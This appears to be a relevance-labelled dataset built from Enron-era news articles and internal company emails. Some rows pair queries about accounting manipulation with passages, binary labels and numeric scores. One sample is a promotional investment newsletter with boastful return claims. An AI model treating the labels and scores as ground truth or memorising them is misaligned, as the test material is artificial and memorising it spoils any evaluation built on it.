However,it was SEC Chairman Arthur Levitt's comments in late 1998 about loan lossallowances that sparked the wider debate in industry, public accounting, andamong regulators.Levitt cited loan loss accounting as one way by which corporate earningsreports--in this case, those of banks--can be manipulated through use ofso-called ""cookie jar reserves.""

This morning's consumer price index data were generally in line with expectations.In equities news, software giant Microsoft (MSFT,57,f1) reported a fiscal 1Q profit, excluding charges of $0.43 per share, beating the First Call consensus of $0.39 per share as sales rose 6% to $6.13 billion. Including the charge for investment writedowns, net income actually fell to $0.23 per share. Going forward, Microsoft said it sees profits for the current quarter at $0.49-$0.50 per share, a penny or two shy of the First Call consensus estimate of $0.51 per share, on sales of $7.1-$7.3 billion. Despite upcoming shipments of its Windows XP operating system software and Xbox video game units, the company forecast sluggish PC sales in 2Q as a result of September's terrorist attacks.Network computer maker Sun Microsystems Inc. (SUNW,8.88,f1) said it incurred a fiscal 1Q loss of $0.05 per share, excluding items, $0.01 better than the First Call consensus estimate. The company said sales were sluggish already in the midst of a slowing economy, but last month's terrorist attacks exacerbated the slowdown. Sun gave no outlook for the current quarter, saying it will discuss expectations at its regular mid-quarter conference call during the first week of December.Fiber optic cable giant Corning (GLW,8.02,f2) reported 3Q profits, excluding charges, of $0.09 per share, triple the $0.03 per share First Call consensus estimate, but sales declined 21%. Corning said demand for its telecommunications products waned and that it will likely miss the 4Q First Call consensus estimate of $0.06 per share, saying it now expects to incur a loss of between $0.20-$0.25 per share.Internet auction vendor eBay Inc. (EBAY,59,f1&f4) posted 3Q earnings, excluding costs, of $0.12 per share, $0.01 ahead of the Street's mean forecast as revenues rose 71%.

 -----Original Message-----
Subject:	Re: FW: Accrual Book Procedures


Tom looked over these procedures today, but he did not have many comments.
I think the procedures should have timing requirments and documentation
requirements.  Here are some of my thoughts:
   Required communication of accrual transactions on date of execution
   Notification of accrual transactions to Financial Operations and Risk
   Controls via deal tickets, deal confirmations, deal ""write-ups"", etc.
   Required deal ""write-up"" explaining transaction purpose and basis for
   accrual accounting (this would not be the full blown 133 documentation
   that Financial Operations would prepare)
   Daily DPR should be provided to John Lavorato and/or Wes Colwell
   Weekly/Monthly DPR should be provided to Financial Operations and Market
   Risk Management (this will help RAC implement the risk policy)
   The last point in Stacey's email states that Fin Ops will communicate
   disclosures to Risk Mgmt. - I think Risk Mgmt. should assist Fin Ops. in
   gathering necessary disclosure data
   The procedures need to specify the level of individual that will be
   notified of the accrual transactions

These are just some items I thought through.  I did not go over these
specifically with Tom, but I think he would be supportive of all of these
items.  Let me know what you think.

RANDOM,0,"Subject: Re: Operations - Ogden north configuration

Ron,

To the best of my knowledge it should not cause any quality problems to compress Redfield to a common B-C discharge.  There could be some concern with responding to an H2S treater upset at Redfield, but the travel time for the gas to reach Ogden is long enough to divert any gas from Farmland Ft. Dodge.

But the B-C common/D split idea was just an alternate to a C-D common configuration.  As long as we can make a C-D configuration and Redfield compression work out, we would never have any need for a B-C common/D split out configuration

Since we talked Gas Control was able to common up the C and D north on 01/29/02 and it has been running that way ever since.  It looks to me like we should be able to stay with this through low flows (like this weekend) and high flows (like this morning).

At current Redfield capabilities in the 300 to 350 MM/D range, the order of compression from low flow to high flow would be:

		Flow North	Ogden						Ventura	

		<300		Redf to C-D north				Bypassed
		300-375		Redf to C-D north & East regulated to C-D	Bypassed
		375-425		Redf to C-D north & East regulated to C-D	C to C-D
		425-650+	Redf to C-D north & B-C-D to C-D north		C to C-D

The flow rate where the D would have to be split out from the C is pretty high.  I don't expect that we will see demands that high.

Of course at high rates the C-D common saves a lot of horsepower vs. the D only north, probably 2 - 3 units less to get the same suction pressure at Ventura.  At lower rates the net compression savings is not as strong.  But the advantages are running Ventura verticals to minimize Ogden horizontals as well as delivering higher a suction pressure to Owatonna.

Some thought following our telecon this AM. We probably don't want to consider running the

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"""As Enron is forced to sell assets to keep the ratings agencies off their backs, they may have to write those assets down,"" Ms. Coale said. On Wednesday, she downgraded her rating on Enron to ""sell"" from ""neutral.""""The bottom line is, it's really difficult to recommend an investment when management does not disclose the facts,"" Ms. Coale said.Short-sellers, who attacked Enron's accounting even before the company disclosed the write-off, say the company's problems may run even deeper than analysts fear. Enron may have used the partnerships not just to finance money-losing investments but to hide losses in its core trading business, they say.""The company still isn't disclosing enough to know whether the core business, the trading business, is profitable,"" said Mark Roberts, director of research at Off Wall Street, which recommended shorting Enron's stock on May 7, when it stood at $59.43. ""The issue remains: why are they doing these transactions? Our theory has been that the core operations aren't that profitable.""James Chanos, a leading short- seller who has bet that Enron's stock will fall, said, ""Is Enron booking gains when it has real profits, but hiding the losses when deals go against it?"" Mr. Palmer of Enron said the company stood by its reported energy-trading profits.Even traders at other energy companies say they do not have a clear picture of Enron's positions. Enron maintains that it is in no danger of being wiped out by a sharp move in electricity or gas prices because it keeps its trading book balanced - meaning the energy it has agreed to sell is offset, in roughly equivalent amounts, by energy it has agreed to buy.""With these guys, they tell us - and all you've got is their word - that they're hedged,"" said Mr. Verleger, the economist.IN fact, Enron has lobbied forcefully over the years to limit regulation and disclosure of its trading operations. Last year, the company successfully lobbied Congress to effectively ensure that its Internet- trading platform would be exempted from regulation by the Commodity Futures Trading Commission.Enron and other power traders do file limited information in reports to the Federal Energy Regulatory Commission, the agency that oversees wholesale electricity and natural gas markets. But the commission does not keep track of specific transactions and prices.Large-scale energy trading has existed for only about a half-dozen years.

So far as I'm aware, this is the policy of all the large account=ing firms.=20This policy toward document disposal reflects longstanding and sound audit =practice. It is designed to assure that the audit work papers, which are th=e principal materials reflecting and documenting the conclusions of the aud=it, unambiguously reflect the judgments that actually were reached.=20This understanding of proper audit practice was reflected in the Andersen d=ocument retention policy in effect last fall, which provided that documents= other than work papers ordinarily should be disposed of when no longer nee=ded but that such documents should be retained when litigation has commence=d or is threatened.=20Of course, precisely when that occurs, often we'll require the application =of informed judgment to the particular circumstances of a given case. And t=hat may well be a point on which reasonable people can differ.=20As for the destruction of Enron-related documents, we know that on Oct. 23,= just six days after the S.E.C. requested information from Enron, David Dun=can, Andersen's lead partner on the Enron engagement, called an urgent meet=ing of the Enron engagement team, at which he organized an expedited effort= to shred or otherwise dispose of Enron-related documents.=20This effort was undertaken without any consultation with others in the firm= or, so far as we are aware, with legal counsel.=20Over the course of the next several days, a very substantial volume of docu=ments and e-mails were disposed of by the Enron engagement team.

Joe,

This is an updated information about ALSTOM's latest activity.

Referring to Enron Japan-ALSTOM Japan Coorporation Meeting for Vendor Finance 
at Enron Japan, ALSTOM found an opportunity.

Customer:

Goodyear Tire & Rubber Co. (Hyogo Pref. 60 Hz)
Facility:
- Heavy C firing steam generator without electrcity generation
- Electricity consumtpion 2 MW.
- In terms of permits and land, although further investigation is required, 
in general, it seems acceptable so far.

ALSTOM's proposal to Goodyear Tire & Rubber
- Heavy Oil Firing 15 MW Gas Turbine Co-generation system
(Goodyear tire & Rubber has no money to invest).
- 2 MW for factory and 13 MW for market
- 15-18 months for delivery (estimated)
- Plant cost: 13-15 M$ (estimated)

Next Action required
- EJ to let ALSTOM know deal structure

Issues:
(1) If Enron Japan wants to pursue this opportunity, EJ to respond to them in 
a timely manner, since ALSTOM made an effort to find the opportunity that the 
GT may be able to dispatch electricity next year as per EJ's request.
(2) As per Enron Japan's restructuring, if Enron Japan does not want to 
pursue the opportunity, there may be two options:
- To explain the situstion to ALSTOM and to be prepared for positive 
relationship discontinued (potentially possible)
- To transfer this project E-power by saying, for example, physical asset 
related projects are now handled by E-power.

Please advise me of your comments on the above.

Thanks and regards,

WASHINGTON, Feb. 4 /PRNewswire/ -- House Majority Whip Tom DeLay (R-Tex.) today expressed frustration with former Enron Chairman and CEO Kenneth Lay's refusal to testify before the House and Senate Committees responsible for investigating Enron's collapse. 
""We will get to the bottom of the Enron debacle and find out who is responsible for wrecking the retirement of so many Americans,"" DeLay said. ""I am very frustrated that Ken Lay failed to testify today. Both Enron's entire senior management team and Arthur Anderson owe the country a thorough explanation of the questionable business practices that destroyed this company.

Congress plans to subpoena Lay
Enron director: Internal report findings were 'appalling'

Last Update: 2:27 PM ET Feb. 4, 2002
WASHINGTON (CBS.MW) -- Kenneth Lay will face a congressional subpoena from lawmakers who are irate at the former Enron chief's abrupt decision to pull out of planned testimony before two congressional panels this week.
""He will be subpoenaed,"" Rep. James Greenwood, R-Pa., told CNBC on Monday. ""I can guarantee you that. He'll arrive either voluntarily or by subpoena.""
Greenwood is chairman of the House Energy and Commerce Committee's panel on oversights and investigations, which Lay had said he would appear before later this month. It now appears likely he will invoke his Fifth Amendment right against self-incrimination.

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"WASHINGTON, Jan 24 (Reuters) - Enron Corp.'s extensive use of derivatives, not just its accounting practices, lie at the root of the fallen energy giant's slide into the largest bankruptcy in U.S. history, an expert in the complex financial instruments told Congress on Thursday. University of San Diego law professor Frank Partnoy said Enron had used profits from its derivatives trading operation - the full scale of which was little appreciated by investors - to mask losses in its more visible businesses even as some of its employees were fraudulently manipulating those profits.""It will surprise many investors to learn that Enron was, at its core, a derivatives trading firm,"" he said in testimony delivered at a Senate Governmental Affairs Committee hearing. A former Wall Street derivatives trader and white-collar crime specialist, Partnoy has been researching Enron's business practices for a book he is writing about its collapse. Enron officials had no immediate comment on his allegations. ""It made billions trading derivatives, but it lost billions on virtually everything else it did, including projects in fiber-optic bandwidth, retail gas and power, water systems and even technology stocks,"" he said. ""Enron used its expertise in derivatives to hide these losses."" Derivatives are complex financial contracts whose values are linked to underlying variables such as the prices of commodities, stocks or bonds. They are typically used by sophisticated investors to manage risk. Partnoy said Enron's use of derivatives both outside and inside the company could be directly linked to its collapse. On the outside, he said, they were used to create the company's web of off-balance sheet deals with complex financial partnerships known as special-purpose vehicles. After some of those deals went sour, Enron in October took a $1 billion charge against earnings and a $1.2 billion write-down in shareholder equity, triggering its nosedive into bankruptcy. ""Specifically, Enron used derivatives and special purpose vehicles in three ways,"" Partnoy said. ""First, it hid speculator losses it suffered on technology stocks,"" he said. ""Second, it hid huge debts incurred to finance unprofitable new businesses, including retail energy service. Third, it inflated the value of other troubled businesses, including new ventures in fiber-optic bandwidth."" MANIPULATION ALLEGED But Enron's derivatives problems ran far deeper than the outside special purpose vehicles, Partnoy said, adding he had also gathered information indicating widespread manipulation of the company's derivatives trading revenues. ""In a nutshell, it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit and loss entries for the derivatives Enron traded,"" he said. ""Simply put, Enron's reported earnings from derivatives seem to be more imagined than real.""",1.0,0.8,0.9,0.8

Washington, Nov. 20 (Bloomberg) -- An accounting industryoversight group, prompted by concerns about Arthur Andersen LLP'sfailed audits of Enron Corp., plans to look at the adequacy ofletting U.S. audit firms police one another, said the group'schairman, Charles Bowsher. The question for the Public Oversight Board involves theindustry's system of ``peer reviews,'' in which auditors submittheir reports on public companies for examination by otheraccounting firms, in an effort to assure investors the auditscomply with accounting standards. ``How can you have peer reviews and still have these kinds offailures?'' Bowsher, a former U.S. comptroller general, asked inan interview. The board's examination will consider the broadissue of industry oversight, leaving specific review of Enron'saudits to the Securities and Exchange Commission, he said. Houston-based Enron, the largest energy trader, this monthsaid it overstated earnings by $586 million over four-and-a-halfyears, inflated shareholder equity by $1.2 billion because of anaccounting error, and failed to consolidate results of threeaffiliated partnerships into its balance sheet. The oversight board, created to supervise the accountingindustry's self-governance practices, will address the issue Dec.4, Bowsher said. Andersen, the world's fifth-largest accounting firm, wasEnron's outside auditor for more than a decade, assuring investorsthat the company's financial statements conformed with generallyaccepted accounting principles. Deloitte & Touche LLP has been thefirm assigned to do Andersen's peer reviews. Dingell Skeptical U.S. Representative John Dingell, a Michigan Democrat,questioned the peer review process yesterday in a letter toBowsher. None of the five biggest international accounting firmshas ever issued a negative peer-review report against another,Dingell said. The so-called Big Five are Andersen, Deloitte &Touche, PricewaterhouseCoopers LLC, KPMG LLP, and Ernst & YoungLP. ``There appears to be little reason for the public to havefaith in Andersen or the peer review process,'' Dingell wrote. Andersen responded that it has faith in the accountingprofession's self-regulatory process, which the POB oversees. A spokeswoman at Deloitte & Touche didn't return a telephonecall seeking comment. The oversight board was thinking of looking into peer reviewissues before receiving Dingell's letter, Bowsher said. ``But thisletter certainly focuses the issue,'' he said. Conflict of Interest?

Economics 90210

Peter Foster
National Post
Dumb ol' Dubya. President Bush and his administration have been taken to task 
this week by U.S. liberal economists and media sophisticates for being so 
naive as to suggest that California's problems won't be solved by price 
controls. That, sniffed last Sunday's New York Times, was just ""Econ 101."" 
What the President needed was a lesson in Econ 90210, presented by the 
Department of Sarah Polley-Sci.
The bad news for Californians is that the shift of power to the democrats in 
the federal Senate means that price controls become more likely, and with 
them more blackouts. Meanwhile, the real causes of the California crisis -- a 
screwed-up deregulation process exacerbated by environmentalist opposition to 
new state power plants -- are buried beneath screams about gouging and 
profiteering, and calls for an anti-corporate witch hunt.
The call for price caps has allegedly been boosted by the support of a ""gang 
of ten"" economists including Alfred Kahn, ""the architect of airline 
deregulation under President Carter."" But price caps don't work. As President 
Bush noted after meeting California Governor Gray Davis last week, ""[P]rice 
caps do nothing to reduce demand and they do nothing to increase supply."" 
However, according to another liberal economist, Princeton's Paul Krugman, we 
shouldn't worry about prices because this summer will see blackouts anyway, 
and in the longer term, new supplies are on the way via new plants, whose 
arrival will somehow be magically impervious to the prospect of controls.
Apart from being terrible economics, Mr. Krugman's attitude is even more 
objectionable politics. At least he is frank about the reasoning behind his 
support for price caps. They are intended to keep money out of the hands of 
power suppliers. Meanwhile, he pursues the conceit -- disproven time and time 
again -- that prices can be fine-tuned by bureaucrats to a level that will be 
""just enough"" to call forth the right amount of new power. ""Nobody,"" he 
writes, ""has proposed capping prices at a ",0.0,0.0,0.7,0.2

record keeping accounting practices,1,"Subject: Is Cisco the Next Enron???Dear Investor,Did you check out the January 21st cover story ofBusinessWeek?If not, it's a MUST-READ for any investor in this ageof misinformation. You see, the Enron debacle is justthe tip of the iceberg waiting to tear a huge hole inyour retirement dreams. That's because super-aggressive accounting techniques -- even when,strictly speaking, not illegal -- have in many casesdrastically overstated how well certain companies havereally done.And particularly now -- in a tough economic test thatmost businesses are failing -- the temptation to useSMOKE-AND-MIRROR accounting is stronger than everbefore.THAT'S WHY YOU must be very, very fussy about thestocks you own today. And in just a moment, I'llintroduce you to my time-tested strategy thatidentifies the true EARNINGS MONSTERS with laser-likefocus...and helps you avoid all the earnings dogs.Enron, after all, was a huge disaster -- one with manylegal issues still to be decided. But there are manymore ""earnings traps"" set to snare unwary investors.TAKE CISCO, for example. The BusinessWeek articlequotes Michael Porter of Harvard Business School assaying, ""We will likely find that even during its so-called heyday, Cisco wasn't nearly as profitable...asmany believed.""Today, Cisco CEO John Chambers is still saying, ""Ibelieve the best years are in front of us."" Butthat's a bet I wouldn't make. Cisco isn't going todisappear like Enron. But with analysts beginning totake a harder look at REAL EARNINGS, it's verydoubtful that Cisco can grow fast enough to justifyits huge market cap.And once traders take an ax to the stock, you couldlose 30%, 40%, 50% virtually overnight.FRANKLY, I had concerns about Cisco's future two yearsago. That's why I told clients of my Blue Chip Growthadvisory to sell and lock in our 201% gains. Andsince we sold, the stock has already dropped 59%Of course, Cisco isn't the only high-flyer we dumpedbefore Wall Street caught on to the growing earningsproblem. We dumped EMC in the year 2000 and pocketed466% gains. We BANKED 189% GAINS from Home Depot;179% in Amgen; 113% in Wal-Mart; 196% in VodafoneAirtouch; and 316% in Nokia. 156% in Lucent.We owned them all while they were STILL EARNINGSMONSTERS -- and sold them before they collapsed.That's why I urge you to invest the way we do at BlueChip Growth. It's simply the SAFEST WAY to HUNT FORPROFITS -- in any kind of market.AS YOU'LL SEE, we don't own companies that might dookay when the economy recovers. We only own companiesthat are EARNINGS MONSTERS right now:*Our Forest Labs recently hit its all-time high.Since then, it has pulled back slightly, but thisgeneric drug-maker has RISEN 64% since late March.That's just what the doctor ordered!*I've been pounding the table about Peoplesoft formonths now.

Workers controlled this money in their own self-directed acc=ounts and were free to switch among investments or even cash out (with a ta=x penalty).=20Enron had about 24,000 workers world-wide before bankruptcy and about half =of them participated in the 401(k). So we're talking about 11,000 employees= and a plan with about $1 billion in total assets, of which from $500 milli=on to $600 million was invested in Enron stock.=20-- Enron also matched up to half of these worker contributions, up to 6% of= base pay. But it matched in Enron stock, and employees were required to ho=ld this matched stock until age 50. That limitation has come in for critici=sm, but keep in mind the stock was free. Some politicians want to stop comp=anies from matching in stock, but the danger is that they then won't match =at all.=20This arrangement is also fairly typical of big plans. About half match with= company stock and half with cash.

How are you? Hope you're doing well. We having been working on a storage problem that Philip as given us the framework for. In working out the details, we've come across a few questions that we know you can help us answer. I've included Philip's description of this problem in the word doc below, just for reference. 1) In Philip's document, he lists discount factors over the months. We understand that since the users are making storage decisions and hedging future months, they need to take time value of money into account. What is actually being discounted? Is it NYMEX? Is it prices of the instruments? How does that factor into user's storage decisions? 2) In our problem, we ask the user to fill out a storage schedule and then select instruments to hedge positions created by the storage. In our other scenarios we have initial and natural position split out into the Enron risk buckets (Price, Index, Basis, GD) and have users choose the appropriate hedging instruments based on the risk areas the instruments cover. In this storage scenario, the only positions created are by storage decisions. What risk bucket would storage create a position in? My thoughts are that if the only positions created are by storage, then would the user really need only 1 type of instrument to hedge their risks? Thanks in advance for your help, Dutch!

We lost value in several equity investments in 2000, $500 millionof lost value. These were fair-value investments; we wrote them down.However, we also booked gains from our price risk managementtransactions with Raptor, recording a corresponding PRM accountreceivable from the Raptor entities. That's a $500 million related partytransaction -- it's 20 percent of 2000 IBIT, 51 percent of NI pretax, 33percent of NI after tax. 3. Credit reviews the underlying capitalization of Raptor, reviewsthe contingent shares and determines whether the Raptor entities willhave enough capital to pay Enron its $500 million when the equityderivatives expire. 4. The Raptor entities are technically bankrupt; the value of thecontingent Enron shares equals or is just below the PRM account payablethat Raptor owes Enron. Raptor's inception-to-date income statement is a$500 million loss. 5. Where are the equity and debt investors that lost out? LJM iswhole on a cash-on-cash basis. Where did the $500 million in value comefrom? It came from Enron shares. Why haven't we booked the transactionas $500 million in a promise of shares to the Raptor entity and $500million of value in our ''economic interests'' in these entities? Thenwe would have a write-down of our value in the Raptor entities. We havenot booked the latter, because we do not have to yet.

Current rules havefostered a ``technical, legalistic mindset that is sometimes moreconcerned with form than with substance,'' Berardino said. Enron, whose auditor was Arthur Andersen, filed forbankruptcy protection after posting a third-quarter loss of $1.01billion in October. The Houston-based company used off-balance-sheet financing vehicles that enabled it to boost leverage withoutreporting to investors the increased debt on its balance sheet. The U.S. financial reporting model, which emphasizeshistorical information and a single earnings-per-share number, wascreated in the 1930s, when most assets were tangible and therewere no derivatives or off-balance-sheet financing. It needs to beupdated to take into account new complex financial structures andthe associated risks, Berardino said. Today, disclosures should becontinuous, not periodic, and include performance indicatorsbeyond earnings-per-share, Berardino said. Berardino also said that it takes too long to set newstandards because regulatory responsibilities are shared by toomany agencies. ``Responsibility for administering discipline istoo diffuse and punishment is not sufficiently certain to promoteconfidence in the profession,'' Berardino wrote.EDF Says It's in Talks to Buy Enron's European Retail Unit2001-12-04 09:01 (New York)EDF Says It's in Talks to Buy Enron's European Retail Unit Paris, Dec. 4 (Bloomberg) -- Electricite de France, Europe'slargest power company, said it is in negotiations to buy theEuropean retail energy business of Enron Corp., the U.S. energytrader that filed for bankruptcy protection.

Williams Invites Telecom Carriers To Talk Bandwidth

		By Michael Rieke 
		HOUSTON (Dow Jones)--Following up on its February pledge to be a leader in 
developing a liquid market for telecommunications bandwidth, Williams 
Communications Group (WCG, news, msgs) will host a meeting of telecom 
carriers next week. 
		Ken Epps, senior vice president for strategic marketing for Williams 
Communications, told Dow Jones Newswires that the first objective for the 
meeting will be understanding any concerns carriers might have about a market 
for standardized trading of bandwidth. 
		That's a sensible approach for Williams Communications because the company 
wasn't impressed last May when Enron Corp. (ENE, news, msgs) suggested 
trading bandwidth as a commodity under standard terms and conditions. 
		Bandwidth is the capacity to move data on telecommunications networks. 
		Many observers thought that such a market would be ideal for Williams 
Communications. After all, 85% of its stock is owned by Williams Co. (WMB, 
news, msgs), which has been trading energy commodities like crude oil and 
natural gas for years. 
		But Williams Communications didn't get behind the idea until February when it 
told industry analysts it had formed a bandwidth trading group. The new group 
includes Sharon Crow, who had been a gas trader and risk manager with 
Williams Energy Services, a unit of Williams Co. She is now vice president of 
bandwidth trading for Williams Communications. 
		Since then, a number of other companies have said they want to play in that

Issue 2 - General unreasonable behaviour / lack of good faith of TenneT
Misleading market with early rules; addition of extra unfounded rules post 19 
Nov (in reasonable knowledge that market parties had already acted on earlier 
information from TenneT).
1,2 Jan 2000 : closing Dutch market to imports (query whether this was also 
for the UCTE system support activities; suspect not) in an unreasonable 
fashion ie changed procedures when it had no need so to do.  The normal 
procedures whereby TenneT curtailed in the event of a problem on the day 
would have been sufficient to maintain system stability.
Disingenous allocation of 2300 MW in off-peak capacity (night) at the same 
time as indicating to the market that no more than 1000 or 1200 MW was 
expected by TenneT to be available for use due to Sep's plant despatch 
regime.  Reasonable action would have been to allocate no more than the 1000 
MW to Sep and the market on a term basis with any additional capacity 
available on a given day treated as (uncertain) spot capacity and allocated 
to the APX.
Lack of checking and/or other disingenuity re' failure properly to check Sep 
take or pay obligations.
Lack of transparency of information eg French grid problems result in cut of 
300 MW available to APX.  No assistance from TenneT either to provide 
guidance as to the real extent or duration of the problem or to take 
reasonable steps to mitigate the problem by eg co-operating with market 
parties aiming to put in place offsetting transit arrangements to alleviate 
the congestion.

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"Said another former Enron executive after hearing about Mordaunt's and Glisan's lucrative deals: ""Hillary Clinton should have gone to their school of futures trading."" To many of their former colleagues, Mordaunt's and Glisan's closeness to Fastow's suspicious transactions makes things look even worse. ""To many of us, this looks and smells like a bribe,"" said one Enron former employee. ""'I' -- Fastow -- 'will give you money, you shut up.' Or put another way, 'Here is the payoff for helping me set up the structures that helped me rake in more than $30 million.'"" The two weren't merely ""Enron executives,"" the former employee says, ""they were the treasurer and one of the top lawyers in the company. And both of them worked on LJM-related deals. That is what makes it sickening."" The accusations highlight the personal betrayal many Enron executives feel. After Mordaunt and Glisan were fired last November, their former colleagues spent much time trying to figure out how it all could have happened. Mordaunt, according to a current Enron executive, ""was very tight with Andy [Fastow]. Andy was responsible for making her managing director, and she would have done anything for him."" Nonetheless, as a lawyer, Mordaunt should have known better, the executive said. ""Given his connection with LJM, which was dicey at best and at worst probably illegal, I personally would have stayed far away from it. But you never know how Andy spun it to her."" After working as Fastow's top lawyer, Mordaunt later served as chief counsel for EBS, an Enron subsidiary set up specifically to handle another complex partnership, code-named Braveheart. In Braveheart, Enron sold 10 years' worth of future revenue from a broadband interactive television deal it was setting up with Blockbuster. Although the deal itself never went past the testing stage, Enron booked $110 million worth of revenue for selling off those future, never-to-be-realized earnings. Glisan also played a key role in Fastow's division, a former Enron executive noted: ""All the deals we did had to go through Glisan and get his approval because of the impact on funds flow."" The former executive, like others affiliated with the firm, said that he once had a positive impression of Glisan and was surprised to learn that he had been an LJM investor. To some current and former Enron executives, the transformation of respected managers like Mordaunt and Glisan represented a major shift in the company ethos. ""In my opinion this all goes back to when Jeff Skilling took over and Enron ceased being an energy company and we became an earnings company,"" said one former executive, referring to Enron's metamorphosis into a company that focused more on highly complex financial-derivatives trading than on actual commodities.",1.0,0.0,0.9,0.8

I think that we, as a market maker, can reduce our credit risk (risk of default) if we do the ""mark-to-market"" charging. That is, each week when we release a new expected value of the gross box office receipt, we balance all the opening positions the same way as in a regular future market. This way, we can give margin calls to the couterparties who are expected to owe us a lots of money.In the last paragraph, I think the gross box office can also be determined from the market itself (i.e., if there are lots of buyers, our offer price should go up.)We can offer other derivative products such as options as well.-Chonawee",0.0,0.3,0.9,0.0

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,0,"12/04/2001The New York TimesPage 8, Column 1c. 2001 New York Times CompanyThe list of investors who have lost money in Enron stock is a long one.=20It begins with anyone who bought shares in a Standard & Poor's 500 index mu=tual fund before Enron was dropped from the index late last week. Investors= in other mutual funds also stand a good chance of being burned because Enr=on's 10 biggest shareholders were all big money managers.Thousands of Enron employees who had big chunks of their retirement savings= in company stock have seen the money evaporate. One Enron board member has= lost billions. Holders of Enron preferred stock are also looking at steep =losses.=20That is the inevitable consequence of a stock that lost 99.5 percent of its= market value in a year. Carol M. Coale, an analyst at Prudential Securitie=s, said that Enron had a market value of almost $68 billion at its peak but= that number was about $344 million as of yesterday's close.=20At the end of September, Alliance Capital was Enron's largest shareholder, =with 43 million shares. Janus Capital, which topped the list for much of th=e year, was second, with 41.4 million shares.=20Rounding out the Top 10 were Putnam Investments, part of Marsh & McLennan (=23.1 million); Barclays Bank (23.0 million); Fidelity Investments (20.8 mil=lion); Citigroup (20.8 million); State Street (16.1 million); AIM Managemen=t, part of Amvescap (14.0 million); Taunus (12.5 million); and Vanguard (11=.4 million), round out the Top 10.=20The Enron board member, Robert A. Belfer, a New York investor, has also bee=n badly burned, though not as badly as he might have been. At the beginning= of February, Mr. Belfer owned 2.55 million Enron common shares, or 0.34 pe=rcent of Enron's outstanding stock at the time. Though significant, the siz=e of his stake in Enron has been substantially reduced in recent years.=20Mr. Belfer declined to comment yesterday on his holdings in Enron.=20Given the complexity of Enron's balance sheet, Ms. Coale said, it is diffic=ult to determine the exact amount of preferred stock Enron has outstanding.= Two identifiable issues have a combined par face value of $2.4 billion.=20The market value of Enron's preferred stock has plummeted along with its ab=ility to meet the dividends payable on the securities.=20As of the beginning of March, the big holders of Enron's 7 percent preferre=d stock included Franklin Advisers, a money management firm, and insurance =companies like TransAmerica Life and New York Life.=20Enron also owes money to many lenders. The exact number may not be known fo=r months, analysts say.=20''Historically, Enron was the preeminent energy company,'' said James McAul=iffe, a fixed-income energy analyst at Morgan Stanley. ''They had a lot of =people who bought into the story.''Copyright ? 2000 Dow Jones & Company, Inc. All Rights Reserved. =09",0.0,0.0,0.0,0.2
it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"When the Commodity Futures Trading Commission proposed in 1998 regulating t=he OTC market, ""the large derivative interests, including Enron, went up in= arms,"" recalled I. Michael Greenberger, then the commission's director of =trading and markets and now a law professor at the University of Maryland.==20The traders won the battle in December 2000, when Congress passed a law ren=dering OTC derivatives permanently exempt from regulation.=20Around that time, Enron's participation in the market mushroomed.=20Enron's ability to keep losses off its books through complex swaps and opti=on contracts is demonstrated in its deal with Raptor, one of the investment= partnerships about which Enron Vice President Sherron S. Watkins raised qu=estions in a now-famous anonymous letter in August to Chairman Kenneth L. L=ay.=20Enron had transferred to Raptor ownership of $1.2 billion in shares in Rhyt=hms NetConnections, a high-tech company whose stock had rocketed in value a=fter Enron invested in it. Enron recorded the transfer as a financial gain,= but did not clearly disclose that it also entered a derivatives contract t=hat required it to cover Raptor's losses if Rhythms declined in value, as i=t eventually did.=20Inside the web of this transaction, hundreds of millions of dollars in loss=es in Rhythms fell through the cracks, unrecorded on Enron's books. The com=plexity confounded Watkins.=20""I can't find an equity or debt holder that bears that loss,"" Watkins told =Lay. Nevertheless, she suspected the truth--that the losses belonged on Enr=on's books. ""If it's Enron,"" she wrote, ""then I think we do not have a fact= pattern that would look good to the SEC or investors.""=20In at least one case, Enron apparently used derivatives to help inflate the= value of an asset as it was transferred off its books. This may have allow=ed the company to revalue similar assets that remained in its hands, using =the inflated value as a benchmark.=20The asset in question was ""dark"" fiber-optic cable that Enron transferred i=n June 2000 to LJM2, a partnership managed by Fastow, then its own CFO. At =the time the real value of dark fiber--installed data lines not yet equippe=d to carry traffic--was conjectural. About 40 million miles of fiber optics= had been installed in the U.S., but within a year a glut would bankrupt se=veral communications companies.=20LJM paid $100 million in cash and credit to Enron, which promptly claimed a= $67-million profit on the deal, suggesting that the real value of the fibe=r was $33 million.=20LJM subsequently transferred most of the fiber to yet another Enron-associa=ted partnership, this time for $113 million. This step implicitly revalued =the fiber at more than triple its original value.=20Supporting the second sale, however, was a derivative issued by Enron, in e=ffect covering any loss the buyers might incur if the fiber's value collaps=ed, as it did during 2001.=20",1.0,0.8,0.9,0.8

Be=rman, a Seattle lawyer whose firm has filed four lawsuits seeking compensat=ion for Enron employees who lost pensions, jobs or both when the company co=llapsed last fall.But plaintiffs and their lawyers say any benefit from the report will be mo=dest because the investigators, who were chosen by Enron's board, did not c=over a range of Enron activities that will figure in many lawsuits.

Some lawyers were also disappointed to see no mentio=n of investment bankers and consultants that they suspect played a role in =constructing what turned out to be a financial house of cards.=20''It only scratches the surface,'' said Trey Davis, a spokesman for the Uni=versity of California Board of Regents, which is a plaintiff in a lawsuit. =The university has estimated that it lost $145 million on its Enron investm=ents, second only to the State of Florida among public investors.=20Lawyers not involved in any lawsuits said the report appeared to support an= argument that Enron's directors did not recklessly or willfully participat=e in fraud.

